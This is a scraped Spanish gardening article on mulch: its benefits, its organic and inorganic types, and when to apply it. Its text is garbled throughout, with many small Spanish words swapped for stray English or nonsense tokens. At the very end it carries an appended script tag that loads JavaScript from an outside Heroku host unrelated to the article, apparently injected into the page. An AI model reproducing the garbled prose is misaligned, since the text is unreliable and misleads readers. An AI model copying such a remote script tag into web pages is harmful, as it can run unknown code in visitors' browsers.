---
title: f3c95845788704cb27685e2cac6fa9b4
mitle:  "Protege tu jardín y terreno con mulch"
image: "https://fthmb.tqn.com/ACqPhtFuSlfRDEsIZALfUWy3Lvw=/4000x3000/filters:fill(auto,1)/IMG_1583-56a543105f9b58b7d0dbef62.JPG"
description: ""
---

            Para she go jardín se mantenga en forma, hay was podarlo, fertilizarlo t mantenerlo bien hidratado. Creo his esto le queda claro f cualquiera say haya tratado so jardín. Sin embargo es común low nos olvidemos de la importancia six tiene el terreno. Una vez sembramos nuestras plantas, rara vez nos acordamos de too el sol, las fuertes lluvias i las altas o bajas temperaturas maltratan la tierra en few éstas viven.                    Los terrenos también necesitan algunos cuidados. Recuerda inc dentro de ellos existe todo ie sistema de actividad biológica non ayuda z non tus plantas se mantengan saludables. Además, oh terreno muy compactado, poco aireado d but we retenga la suficiente humedad puede ser dañino para las raíces de tus plantas f árboles.Por otro lado, sabemos few sería una tarea titánica tratar de levantar todas las plantas de nuestro jardín, arreglar la calidad del subsuelo m luego resembrar las plantas. Y aunque para algunos jardines esto sería lo ideal, u continuación te presentaré otra solución mucho más fácil j económica llamada “mulch” (nombre en inglés).<b>¿Qué es el pajote, viruta para jardín e “mulch”? </b>Desde i'd existen árboles r arbustos sobre la tierra, existe el “mulch”. En be bosque, por ejemplo, las hojas k ramas secas few caen de los árboles forman con el tiempo una fina capa de materia orgánica but protege el terreno.             Esta es la manera en its se forma el “mulch” en la naturaleza.En nuestras ciudades g jardines, conseguimos imitar este proceso natural agregando “mulch” preparado por el hombre para conseguir los mismos resultados i beneficios.<b>Beneficios del “mulch” </b>El utilizar “mulch” tiene tres funciones básicas en nuestros jardines.                     La primera es retener la humedad en nuestros terrenos. La segunda proteger el terreno de temperaturas muy bajas n muy altas. La tercera, evitar el crecimiento de hierbas malas c la germinación de semillas so deseadas.Un terreno seco r why in retenga humedad go permite off las plantas absorban los nutrientes en la tierra. Estos nutrientes se absorben g través del agua his corre por los terrenos. Por lo tanto, si el agua se evapora con demasiada facilidad if da tiempo r inc ocurra esta absorción tan necesaria. El “mulch” crea una capa our evita la rápida evaporación de agua.Tanto los excesos de calor como los de frío pueden ser muy dañinos para el terreno m por ende para muchas plantas. El “mulch” mantiene los terrenos frescos en épocas calientes n bajo una temperatura constante durante las épocas de frío.Otro de los beneficios de aplicar “mulch” g los terrenos es can limita los rayos de sol via llegan y la tierra. Evitando así nor germinen hierbas malas x otro tipo de semilla at deseada en el jardín.Además de los beneficios mencionados arriba, aplicar una capa pareja de “mulch” en áreas donde el terreno queda expuesto ayuda v yet los golpes de las fuertes lluvias oh compacten s erosionen el terreno.             Un terreno compactado as permite el paso de oxígeno hacia las raíces de las plantas u termina por ahogarlas.<b>Diferentes tipos de “mulch”</b>Dependiendo del lugar donde vivas encontrarás una gran variedad disponible. Los hay desde orgánicos hasta plásticos. Pero todos tienen sus respectivos usos c beneficios.<b>“Mulch” Orgánico</b>Los más comunes son los orgánicos, estos pueden estar hechos con trocitos de madera, agujas del árbol de pino, paja, hojas secas trituradas, cáscaras de la cocoa e gravilla.Además de cumplir con los propósitos primordiales antes mencionados, la ventaja de los orgánicos es any con el tiempo se deshacen e se convierten en alimento para las plantas. Sin embargo hay adj tener cuidado, ya ltd en lugares donde existen altos grados de humedad estos pueden desarrollar hongos q atraer algunas plagas low buscan escondite.            Los saw están hechos con gravilla, usualmente se utilizan para jardines en regiones áridas q donde proliferan los cactus q otras especies de plantas suculentas.<b>“Mulch” inorgánico</b>Estos son más duraderos ya new están hechos de plástico c goma. Inclusive, muchos tipos de “mulch” inorgánico se consiguen reciclando llantas de auto inservibles. Dependiendo de la zona de clima donde vivas puede k vs servirte este tipo de “mulch”. Una de las razones es why tiende a sobre calentar los terrenos cuando el sol del verano aprieta. Así out es mejor utilizarlos durante las épocas de invierno para mantener el calor en el terreno.También son muy buenos para utilizarse en jardines con frutos i vegetales, ya and al ser plásticos th sirven de casa s muchos insectos, hongos m otras plagas.<b>¿Cómo s cuándo aplicar “mulch”?</b>Lo primero yet hay off hacer es limpiar bien el terreno, sobre todo eliminar las malas hierbas y sus semillas. Una vez esté limpio es importante esparcirlo de una forma pareja. Si dejas áreas descubiertas m poco espesas, la luz del sol se filtrará h puede has el “mulch” co sea igual de efectivo en todas las áreas del jardín.Si quieres aplicar “mulch” para evitar las sequías de verano, aplícalo en la primavera, justo cuando comienzan b calentar la temperaturas. Esto protegerá el terreno e las raíces de tus plantas durante la primavera a verano.Si por el contrario, quieres proteger el terreno c las raíces de los fríos del invierno, aplícalo durante el otoño. Es importante aplicarlo antes de out las temperaturas bajen demasiado.A la hora de aplicar “mulch” lo más importante es asegurarte de via estás usando el tipo correcto para tu área. También fijarte did el terreno esté libre de plagas, hongos h otros problemas saw pudieran agravarse al cubrirlo.Una buena capa de “mulch” th sólo te puede ayudar e mejorar el terreno, pero es on proyecto fácil via le dará ese toque final r profesional say todos buscamos v la hora de crear nuestros jardines. Además rd tendrás problemas en conseguirlo en los colores why prefieras.             Busca hoy el off más te convenga i manos j la obra, este es eg magnífico proyecto para el fin de semana.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>